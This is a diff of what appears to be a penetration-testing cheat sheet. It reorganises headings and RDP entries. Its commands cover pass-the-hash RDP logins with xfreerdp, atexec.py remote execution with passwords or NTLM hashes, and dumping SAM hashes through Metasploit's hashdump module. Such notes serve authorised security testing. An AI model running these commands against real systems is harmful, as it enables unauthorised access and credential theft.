@@ -88,11 +88,11 @@ RDP with NTLM hash:
 
 - `xfreerdp /v:172.16.231.221 /u:amit /pth:<NTLM HASH> +dynamic-resolution +clipboard`
 
-### <ins>RDP to host</ins>:
-- `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' +dynamic-resolution +clipboard`
-- `echo yes | rdesktop -z -P -x m -d [Domain_name] -u [Username] -p [password] [IP_Address] 1>/dev/null 2>/dev/null &`
+### RDP to host:
+- Password auth: `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' +dynamic-resolution +clipboard`
+- PassTheHash auth: `xfreerdp /v:172.16.231.221 /u:amit /pth:'<NTLM>' +dynamic-resolution +clipboard`
 
-### <ins>atexec.py</ins>
+### atexec.py
 
 - `atexec.py test.local/john:password123@10.10.10.1 whoami'`
 - `atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami`
@@ -102,7 +102,7 @@ RDP with NTLM hash:
 
 - `schtasks /run /tn "SystemTask"`
 
-### <ins>Dump SAM</ins> (Make sure session is running with SYSTEM privileges)
+### Dump SAM (Make sure session is running with SYSTEM privileges)
 - Background the meterpreter session with `bg`.
 - `use post/windows/gather/hashdump`
 - `set SESSION <Session Number>`
